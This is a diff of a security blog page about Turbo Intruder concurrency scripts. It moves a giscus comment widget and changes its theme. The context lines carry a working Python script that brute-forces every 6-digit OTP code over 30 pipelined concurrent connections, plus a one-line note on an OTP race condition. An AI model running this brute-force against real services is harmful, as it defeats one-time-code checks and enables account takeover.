@@ -204,22 +204,7 @@
     
 
     
-    <!--评论-->
-    <script src="https://giscus.app/client.js"
-        data-repo="tea9/tea9_giscus"
-        data-repo-id="R_kgDOMsAxBg"
-        data-category="Announcements"
-        data-category-id="DIC_kwDOMsAxBs4CiKYB"
-        data-mapping="pathname"
-        data-strict="0"
-        data-reactions-enabled="1"
-        data-emit-metadata="0"
-        data-input-position="bottom"
-        data-theme="purple_dark"
-        data-lang="zh-CN"
-        crossorigin="anonymous"
-        async>
-    </script>
+
     <article class="post-wrap">
         <header class="post-header">
             <h1 class="post-title">Turbo Intruder并发脚本</h1>
@@ -256,6 +241,22 @@
 <h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>竞争条件之：给两个不同的手机号发送otp会发送同样的otp</p>
 <h2 id="爆破6位数验证码"><a href="#爆破6位数验证码" class="headerlink" title="爆破6位数验证码"></a>爆破6位数验证码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">def brute_veify_code(target, engine, length):</span><br><span class="line">    pattern = &#x27;1234567890&#x27;</span><br><span class="line">    for i in list(product(pattern, repeat=length)):</span><br><span class="line">         code =  &#x27;&#x27;.join(i)</span><br><span class="line">         engine.queue(target.req, code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def queueRequests(target, wordlists):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">            concurrentConnections=30,</span><br><span class="line">            requestsPerConnection=100,</span><br><span class="line">            pipeline=True</span><br><span class="line">            )</span><br><span class="line">    brute_veify_code(target, engine, 6)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def handleResponse(req, interesting):</span><br><span class="line"># currently available attributes are req.status, req.wordcount, req.length and req.response</span><br><span class="line">  if &#x27;error&#x27; not in req.response:</span><br><span class="line">       table.add(req)</span><br></pre></td></tr></table></figure>
         </div>
+ <!--评论-->
+   <script src="https://giscus.app/client.js"
+        data-repo="tea9/tea9_giscus"
+        data-repo-id="R_kgDOMsAxBg"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOMsAxBs4CiKYB"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+</script>
 
         
             <section class="post-copyright">
